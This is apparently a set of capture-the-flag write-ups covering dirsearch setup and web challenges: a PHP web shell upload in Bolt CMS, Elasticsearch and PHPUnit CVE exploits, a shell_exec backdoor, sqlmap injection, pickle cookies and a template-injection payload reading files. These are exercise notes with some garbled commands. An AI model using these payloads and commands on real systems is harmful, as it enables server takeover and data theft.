# Installing Dirsearch
The first thing we need to do is install dirsearch from GitHub. 

The easiest way to do this is with git. So if it's not already installed on your system, do so with the following command in the terminal:

$sudo apt-get update
$sudo apt-get install git
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/fa7bf001-3757-4cc7-986f-9898f5a56c3c)

Now we can use the git clone command to clone the directory where the tool is located:

$git clone https://github.com/maurosoria/dirsearch
$cd dirsearch/
$python3 dirsearch.py      #run dirsearch
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/5ea41a82-ea53-4e6e-90db-d6db23a75574)
git clone https://github.com/maurosoria/dirsearch.git --depth 1

The last way to run dirsearch, which is my preferred method, is to create a symbolic link in the /bin directory. This will allow us to run the tool from anywhere, as opposed to only in the directory cloned from GitHub.
$cd /bin/

create a symbolic link to the tool using the ln -s command:
$sudo ln -s ~/dirsearch/dirsearch.py dirsearch

Here we are naming it dirsearch, so when we run dirsearch now in the terminal, the tool will be able to run from any directory. 
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/3affa48f-5008-429b-9ea1-0910fcfd2caf)



## bolt
Let's try: View Page Source, pay attention to p This website is... /p, add /bolt to URL and guess the user and pass (admin, password).

Once you are in you need to go to file management to see if you can upload some malicious files. Let’s try to create and upload a vulnerable rce.html file

click file and start editing < ?php echo system($_GET['cmd']);? >
Go to options and rename the rce.html file to rce.php

Click on rce.php
Add cmd=id
cmd=ls-l
cat /flag.txt
CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}
## elastic
Hints:
Hint 1:  Elasticsearch < 1.6.1 Arbitrary file read CVE (version)

The main web page exposure sensitive information about the version of Elasticsearch
application. 

The main of this scenario is to identify the vulnerability like in the real scenario.

Try to find an exploit

Searchable archive from The Exploit Database. https://www.exploit-db.com/

Search for remote Oracle exploits for Windows:
Installation:

$sudo apt install exploited

$sudo apt install libxml2-utils

Dependencies: libxml2-utils

$searchsploit elasticsearch

The vulnerability present in the current scenario offers more details about 
CVE-2015-5531- Arbitrary file Vulnerability. 

The exploit can be found here:

https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py

$ python3 exploit.py URL /etc/passwd 
CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}
## php unit
A website is provided as a reference to my unit is feeling a little off. So first we can try to understand php unit. For example, we can use the automatic tool Dirsearch, which brute-force searches for vulnerabilities in directories.

$ dirsearch -u URL

From these addresses we can select the ones that are interesting to us like /composer.json, Here we can find versions of php-unit and /eval-stding.php
Vulnerable path. Let’s check: /composer.json where we can understand that our php uni is vulnerable (CVE-2017-9841).

Now exploit the vulnerable path using Burpsuite: < ?php system('cat /flag.txt')? >
CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}

## nodiff-backdoor
After performing some recon using *dirsearch* on the targeted web application, we can find a *backup.zip* archive.

$ dirsearch -u URL

Download the backup file from the following URL: http://34.107.45.207:30148//backup.zip 
(take note that the IP address can change based on the functionality of the CyberEDU platform.) 

In this way, we obtain the source code of the application.

$ wget http://34.107.45.207:30148//backup.zip 

Copy backup.zip to the new folder and unzip it. 

Now is the time to find some backdoor. Because applications use PHP code we try to search for vulnerable function in PHP:
https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720

We can try to search for all the vulnerable functions. After few tries observe we got the vulnerable function (shell_exec()) in the next path: “wp-content/themes/twentytwentytwo/functions.php”

$ grep –r “shell_exec(“

The next step is to execute the backdoor to access the server based on what we have. 
If we have the parameter welldone=knockknock, then execute parameter shazam=<injection>
![image](https://github.com/Mariam-kabu/cybersec-labs/assets/82336496/5ed643c1-2038-4a23-ba9f-b3c823729699)
function sentimental_function) {
If ($_
_GET [ 'welldone'] == 'knockknock') {
echo shell_exec($_GET[ ' shazam' ]) ;
Now let’s get the flag in the source of the page:
http://34.107.45.207:30148/?welldone=knockknock&shazam=id

http://34.107.45.207:30148/?welldone=knockknock&shazam=cat flag.php
CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}

## SQL
After a few attempts of web application reconnaissance using dirsearch -u , we obtain a register endpoint.
choose register.php because it is successful link.
register

When we put “%” into the field, the list of all the products is showed. At this moment, we can conclude that the page with search functionalities implemented is vulnerable to SQLi injection. To proceed further with the attack, copy the cookie from the POST request obtained with Burp and use SQLmap on it. we use it for the command to have valid session
product_name=%25&submit=Search

sqlmap --cookie="PHPSESSID=..." -u URL --forms --colums --random-agent
CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}


## Fask
try dirsearch and chek urls

for /auth We are not allowed to use GET requests because we got some error, 
so let’s try to use POST  requests.

## s&s
Usually, when something similar is noticed, it is recommended to look in the header section of the web application. 
From header we can obtain, that it is python server and set-cookie is shown right there
curl -i URL

Once we try to decode the cookie using base64, we can see, that some words appeared as the result
echo -n "cookie" | base64 -d 

After decoding the cookie, we obtain the message "Try harder" and some junk data. Based on what information we have gathered until now ( Python server, cookies in base64 format + some junk ) we can conclude that this is a pickle server. At this moment we can send some pickle payloads to the server which will lead to arbitrary file read vulnerability. 

*run python payload change only URl*
python PayLoad.py

## online
Search for traffic using http filter. 10476... Follow the HTTP stream with the shortcut Ctrl+Alt+Shift+H

Eventually we can spot suspicious traffic to www.txtwizard.net (plain text). filter for 10.0.0...

Now we can copy the messages and filter them with regexes in a text edition with an engine
implemented to get only the plainText argument values.
An example regex is:
plainText=(.*?)&key

https://base64decode.org/

After we convert from base64, we can observe that the new text seems to be obfuscated with: rot13 RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}

## sea
Server Side Template Injection
{{7*7}}

curl -I URL

burp suit: 
name=<%
import os
x=os.popen('cat flag').read()
%>${x}

